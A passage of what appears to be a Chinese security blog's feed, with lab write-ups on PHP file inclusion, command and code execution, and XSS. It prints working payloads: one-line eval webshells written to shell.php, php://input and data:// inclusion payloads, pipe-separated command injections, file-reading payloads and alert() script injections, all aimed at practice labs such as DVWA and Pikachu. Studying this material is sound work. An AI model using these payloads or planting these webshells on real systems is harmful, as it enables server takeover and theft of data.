src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019205437.png" alt="image.png"></li></ul><h2 id="实例piakchu"><a href="#实例piakchu" class="headerlink" title="实例piakchu"></a>实例piakchu</h2><ul><li>制作一句话木马.txt<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;webshell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>通过抓包修改filename地址，远程运行代码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019210741.png" alt="image.png"></li><li>成功运行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019210900.png" alt="image.png"></li></ul><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问http(s)网址</td></tr><tr><td>ftp:&#x2F;&#x2F;</td><td>访问FTP(s)URLs</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流(I&#x2F;O streams)</td></tr><tr><td>zlib:&#x2F;&#x2F;</td><td>压缩流</td></tr><tr><td>data:&#x2F;&#x2F;</td><td>数据(RFC 2397)</td></tr><tr><td>glob:&#x2F;&#x2F;</td><td>查找匹配的文件路径模式</td></tr></tbody></table><ul><li>PHP内置了很多URL风格的封装协议，可用于类似<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>和<code>filesize()</code>的文件系统函数</li></ul><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a><code>file://协议</code></h2><ul><li><code>file://C:/Windows/system.ini</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019212143.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019212151.png" alt="image.png"></li></ul><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h2><ul><li>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>  <blockquote><p>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p></blockquote></li><li><strong>php:&#x2F;&#x2F;filter</strong>：读取源代码是需要进行base64编码，不然会被直接执行</li><li>条件：<code>allow_url_fopen</code> ：off&#x2F;on、<code>allow_url_include</code>：off&#x2F;on</li><li><code>php://filter/convert.base64-encode/resource=文件路径</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019212916.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019213040.png" alt="image.png"></li><li>再解码就可以看到源码了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019213112.png" alt="image.png"></li><li><strong>php:&#x2F;&#x2F;input</strong>：可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</li><li>条件：<code>allow_url_fopen</code> ：off&#x2F;on、<code>allow_url_include</code>：on</li><li><code>filename</code>处填<code>php://input</code></li><li>直接在请求包最后加入php代码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019214013.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019214341.png" alt="image.png"></li></ul><h2 id="ZIP-协议"><a href="#ZIP-协议" class="headerlink" title="ZIP:&#x2F;&#x2F;协议"></a>ZIP:&#x2F;&#x2F;协议</h2><ul><li>可以访问压缩包里面的文件。当它与包含函数结合时，<code>zip://</code>流会被当作php文件执行。从而实现任意代码执行。<blockquote><p>zip:&#x2F;&#x2F;中只能传入绝对路径。<br>要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）<br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型还有<code>zlib://</code>和<code>bzip2://</code></p></blockquote></li><li><strong>条件：</strong></li><li><code>allow_url_fopen</code> ：off&#x2F;on</li><li><code>allow_url_include</code>：off&#x2F;on</li><li><code>zip://[压缩包绝对路径]#[压缩包内文件]</code></li></ul><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a><code>data://协议</code></h2><ul><li>同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</li><li><strong>条件：</strong></li><li><code>allow_url_fopen</code> ：on</li><li><code>allow_url_include</code>：on<blockquote><p><code>data://text/plain,&lt;?php phpinfo();?&gt;</code><br>&#x2F;&#x2F;如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：<br><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p></blockquote></li></ul><h2 id="伪协议利用条件"><a href="#伪协议利用条件" class="headerlink" title="伪协议利用条件"></a>伪协议利用条件</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019215814.png" alt="image.png"></p><h1 id="文件包含漏洞防护"><a href="#文件包含漏洞防护" class="headerlink" title="文件包含漏洞防护"></a>文件包含漏洞防护</h1><ol><li>使用str_replace等方法过滤掉危险字符</li><li>配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</li><li>php版本升级，防止%00截断</li><li>对上传的文件进行重命名，防止被读取</li><li>对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</li><li>做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE漏洞利用练习</title>
      <link href="/2023/10/16/RCE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/10/16/RCE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="墨者靶场案例"><a href="#墨者靶场案例" class="headerlink" title="墨者靶场案例"></a>墨者靶场案例</h2><ul><li>案例命令注入执行分析<a href="https://www.mozhe.cn/bug/detail/12">https://www.mozhe.cn/bug/detail/12</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016164942.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165223.png" alt="image.png"></li><li>进入网站，先查看网站的系统，因为不同系统的命令不相同</li><li>查看到是Ubuntu，即Linux<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165405.png" alt="image.png"></li><li>输入<code>127.0.0.1| pwd</code>不行，可能是过滤了，每个都去试试<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165504.png" alt="image.png"></li><li>抓包进行分析，发现可以输入了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165906.png" alt="image.png"></li><li>输入<code>127.0.0.1|ls</code>成功发现key文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016170003.png" alt="image.png"></li><li>用<code>cat</code>发现并不能查看</li><li>其他查看文件的命令：less、head、tail、more</li><li>都试试，发现都不行，都是一片空白</li><li>然后在网上找到方法，使用<strong>输入重定向</strong>（最后面有补充）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt; key_268422068410077.php</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016170721.png" alt="image.png"></li><li>这样key就获取到了</li></ul><h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><h2 id="Pikachu靶场案例"><a href="#Pikachu靶场案例" class="headerlink" title="Pikachu靶场案例"></a>Pikachu靶场案例</h2><ul><li>exec “evel”</li><li>这个函数就是将输入框的语句当成php执行</li><li>输入phpinfo();<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016212052.png" alt="image.png"></li><li>通过burpsuite抓包，进行后续修改</li><li>更多的常用方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?txt=@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);   一句话木马</span><br><span class="line">?txt=<span class="keyword">print</span>(<span class="keyword">__LINE__</span>);           显示文件中的当前行号</span><br><span class="line">?txt=<span class="keyword">print</span>(<span class="keyword">__FILE__</span>);           获取当前绝对路径</span><br><span class="line">?txt=<span class="keyword">print</span>(<span class="keyword">__DIR__</span>);            显示文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录</span><br><span class="line">?txt=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;c:\\windows\system32\drivers\etc\hosts&#x27;</span>));  读取文件</span><br><span class="line">?txt=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="number">1</span>],<span class="variable">$POST</span>[<span class="number">2</span>]));</span><br><span class="line"><span class="number">1</span>=shell.php&amp;<span class="number">2</span>=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span>   写shell</span><br></pre></td></tr></table></figure></li><li>获取当前的绝对路径<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016212927.png" alt="image.png"></li><li>读取其他文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016213039.png" alt="image.png"></li><li><strong>一句话木马</strong></li><li>利用语句创建一个php文件，并在里面写入一句话木马<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[fin]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016215134.png" alt="image.png"></li><li>通过中国蚁剑就能查看文件了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016215217.png" alt="image.png"></li></ul><h2 id="墨者靶场案例-1"><a href="#墨者靶场案例-1" class="headerlink" title="墨者靶场案例"></a>墨者靶场案例</h2><ul><li>Apache Struts2远程代码执行漏洞(S2-015)复现<a href="https://www.mozhe.cn/bug/detail/253">https://www.mozhe.cn/bug/detail/253</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220309.png" alt="image.png"></li><li>这里我们用工具可以很快解决</li><li>百度网盘：<a href="https://pan.baidu.com/s/13yIAHLDY1sZliQI6Wg1ZXA?pwd=t95s">struts2漏洞检测工具</a>提取码：t95s</li><li>将url输入进去，点击验证漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220448.png" alt="image.png"></li><li>在下面框中会显示存在的漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220528.png" alt="image.png"></li><li>选择存在的漏洞编号，我选择了S2-046<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220610.png" alt="image.png"></li><li>在命令行当中就能进行输入了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220645.png" alt="image.png"></li><li>key就获取到了</li></ul><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><h2 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h2><ul><li>参考博客<a href="https://blog.csdn.net/wangzhicheng987/article/details/120971092">https://blog.csdn.net/wangzhicheng987/article/details/120971092</a></li><li>这里就看看输入重定向吧<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016221645.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE命令执行漏洞和代码执行漏洞</title>
      <link href="/2023/10/15/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/15/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015203933.png" alt="image.png"></p><h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015204951.png" alt="image.png"></p><ul><li>直接用的pikachu对RCE的介绍</li></ul><h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>命令执行（Remote Command Execution, RCE）</li><li>Web应用的脚本代码在执行命令的时候过滤不严，从而注入一段攻击者能够控制的代码,在服务器上以Web服务的后台权限远程执行恶意指令</li></ul><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><ul><li>代码层过滤不严</li><li>系统的漏洞造成命令注入</li><li>调用的第三方组件存在代码执行漏洞常见的命令执行函数</li></ul><ol><li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li><li>ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等</li><li>Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec等</li></ol><h2 id="常用命令执行函数"><a href="#常用命令执行函数" class="headerlink" title="常用命令执行函数"></a>常用命令执行函数</h2><h3 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h3><ul><li>该函数会将执行的结果输出并将输出结果的最后一行作为字符串返回，如果执行失败则返回false</li><li>是最常使用到的<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h3><ul><li>该函数不会输出结果，但是会返回执行结果的最后一行，可以结合output进行结果的输出。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;pwd&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h3><ul><li>该函数只调用命令，并将运行的结果原封不动的输出，没有相应的返回值。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><ul><li>该函数不会输出结果，返回执行结果</li><li>使用反引号<code>(``)</code>时调用的就是此函数。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h2><h3 id="Windows基础命令"><a href="#Windows基础命令" class="headerlink" title="Windows基础命令"></a>Windows基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping        #测试连通性</span><br><span class="line">tracert      #追踪路由</span><br><span class="line">telnet       #远程连接</span><br><span class="line">dir          #列出目录</span><br><span class="line">ipconfig      #查看ip</span><br><span class="line">arp -a       #查看路由表</span><br><span class="line">calc         #打开计算器</span><br><span class="line">regedit      #打开注册表</span><br><span class="line">netstat -ano  #查看服务器端口信息</span><br></pre></td></tr></table></figure><h3 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd                  #切换目录</span><br><span class="line">ls                   #显示当前目录下的文件</span><br><span class="line">ifconfig              #查看IP地址</span><br><span class="line">cat /etc/passwd       #查看password文件内容</span><br><span class="line">id                  #查看当前用户的id号</span><br><span class="line">cat /etc/group        #查看用户组文件内容</span><br><span class="line">pwd                #显示当前目录</span><br><span class="line">uname -a            #查看当前系统版本</span><br><span class="line">natstat -pantu        #查看当前服务器的端口信息</span><br><span class="line">netstat -nr           #查看网关和路由</span><br></pre></td></tr></table></figure><h3 id="拼接符"><a href="#拼接符" class="headerlink" title="拼接符"></a>拼接符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|  #只执行|后面的语句  </span><br><span class="line">|| #如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句  </span><br><span class="line">&amp;  #&amp;前面和后面命令都要执行，无论前面真假  </span><br><span class="line">&amp;&amp; #如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令  </span><br><span class="line">;  #前后都执行，无论前面真假，类似&amp;</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h3><h4 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h4><ul><li>直接输入127.0.0.1可以得到ping的结果<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015215744.png" alt="image.png"></li><li>如果直接输入dir，是不会有结果的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220112.png" alt="image.png"></li><li>在指令前加<code>|</code>,可以只执行后面的指令，这样就可以无视前面的ping了</li><li>输入<code>| dir</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220313.png" alt="image.png"></li><li>输入127.0.0.1 &amp;&amp; dir就可以都执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220521.png" alt="image.png"></li></ul><h4 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h4><ul><li>可以看见<code>&amp;&amp;</code>和<code>；</code>都被过滤了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220758.png" alt="image.png"></li><li>那就换成<code>|</code>或者<code>&amp;</code></li></ul><h4 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h4><ul><li>这个级别只能用<code>|</code></li><li>但是它过滤了<code>| </code>而没有过滤<code>|</code></li></ul><h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><ul><li>代码执行漏洞是由于服务器<strong>对危险函数过滤不严</strong>导致用户输入的一些字符串可以被转换成代码来执行,从而造成代码执行漏洞</li></ul><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><ul><li>用户能够控制函数输入</li><li>存在可执行代码的危险函数常见代码执行函数</li></ul><ol><li>PHP: eval、assert、preg_replace()、+&#x2F;e模式（PHP版本&lt;5.5.0）</li><li>Javascript: eval</li><li>Vbscript：Execute、Eval</li><li>Python: exec</li></ol><h2 id="常用代码执行函数"><a href="#常用代码执行函数" class="headerlink" title="常用代码执行函数"></a>常用代码执行函数</h2><h3 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a>${}执行代码</h3><ul><li>该执行代码会将中间的php代码进行解析<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;&lt;!-- --&gt;<span class="title function_ invoke__">phpinfo</span>()&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h3><ul><li>该函数会将字符串当作函数进行执行，但是需要传入一个完整的语句，同时必须以<code>；</code>分号结尾，也是<strong>最常见</strong>的函数。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &quot;hello&quot;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h3><ul><li>该函数是判断是否为字符串，如果是则当成代码进行执行，但是在php7.0.29之后的版本不支持动态调用。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//低版本</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//7.0.29之后</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="title function_ invoke__">phpinfo</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h3><ul><li>该函数是为数组的每个元素应用回调函数。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>] = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$a</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//构建的payload</span></span><br><span class="line">?a=assert&amp;b=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><h3 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h3><ul><li>正常输入符号，无论输入哪个符号都是显示这样的文字<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015222246.png" alt="image.png"></li><li>尝试输入<code>phpinfo();</code>，代码被正常执行了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015222500.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs练习level1~13</title>
      <link href="/2023/10/15/xss-labs%E7%BB%83%E4%B9%A0level1~13/"/>
      <url>/2023/10/15/xss-labs%E7%BB%83%E4%B9%A0level1~13/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs环境搭建"><a href="#xss-labs环境搭建" class="headerlink" title="xss-labs环境搭建"></a>xss-labs环境搭建</h1><ul><li>在GitHub当中下载靶场环境压缩包<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></li></ul><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151207.png" alt="image.png"></p><ul><li>第一关当中，看见下面有文字提示，显示<strong>payload的长度:4</strong></li><li>然后在url当中的test也是长度4，猜测是这里，我们随便改改这个<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151339.png" alt="image.png"></li><li>发现随便输入<strong>123456</strong>，payload长度就变成6了，所以这里就是payload的位置</li><li>在这里写入语句<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151507.png" alt="image.png"></li><li>成功了，点确定就进入level2</li></ul><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151927.png" alt="image.png"></p><ul><li>这里猜测和level1一样，但是改在输入框当中了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152057.png" alt="image.png"></li><li>发现语句在引号当中，这样就不能被执行了</li><li>需要让它执行，就在前面加<code>&quot;&gt;</code>，目的是让value参数结束<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 